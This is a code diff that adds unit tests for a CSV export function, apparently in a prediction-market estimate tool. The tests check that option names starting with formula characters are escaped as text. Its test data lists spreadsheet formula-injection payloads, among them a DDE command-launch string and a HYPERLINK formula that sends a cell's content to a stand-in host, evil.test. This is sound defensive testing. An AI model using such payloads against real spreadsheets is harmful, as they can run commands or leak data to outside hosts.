@@ -137,3 +137,46 @@ describe("parseEstimateCsv", () => {
     expect(() => parseEstimateCsv("name,estimate\nVilleneuve,", scales)).toThrow("Row 2: both columns need a value");
   });
 });
+
+describe("serializeEstimateCsv with a name a spreadsheet would run as a formula", () => {
+  const hostile = [
+    "=1+1",
+    "+cmd|' /C calc'!A0",
+    "-2+3",
+    "@SUM(1,2)",
+    "\t=2+2",
+    "\r=3+3",
+    '=HYPERLINK("https://evil.test/?"&A1,"Open")',
+  ];
+  const scaleNamed = (name: string, index: number): OptionScale => ({
+    ...villeneuve,
+    market: `0x${(index + 1).toString(16).padStart(40, "0")}`,
+    name,
+  });
+
+  it.each(hostile)("writes %j behind an apostrophe, so the cell reads as text", (name) => {
+    const [, row] = serializeEstimateCsv([{ name, estimate: 50 }]).split("\n");
+    const cell = row!.startsWith('"') ? row!.slice(1) : row!;
+
+    expect(cell.startsWith(`'${name[0]}`)).toBe(true);
+  });
+
+  it("reads every such name back as its own option", () => {
+    const named = hostile.map(scaleNamed);
+    const csv = serializeEstimateCsv(named.map((scale) => ({ name: scale.name, estimate: 50 })));
+
+    expect(parseEstimateCsv(csv, named).map(({ scale }) => scale)).toEqual(named);
+  });
+
+  it("leaves a name that only starts with an apostrophe as it is, and still matches it", () => {
+    const quoted = scaleNamed("'=1+1", 0);
+    const csv = serializeEstimateCsv([{ name: quoted.name, estimate: 50 }]);
+
+    expect(csv.split("\n")[1]).toBe("'=1+1,50");
+    expect(parseEstimateCsv(csv, [quoted, scaleNamed("=1+1", 1)])).toEqual([{ scale: quoted, value: 50 }]);
+  });
+
+  it("writes a negative estimate as a number", () => {
+    expect(serializeEstimateCsv([{ name: "Villeneuve", estimate: -5 }]).split("\n")[1]).toBe("Villeneuve,-5");
+  });
+});
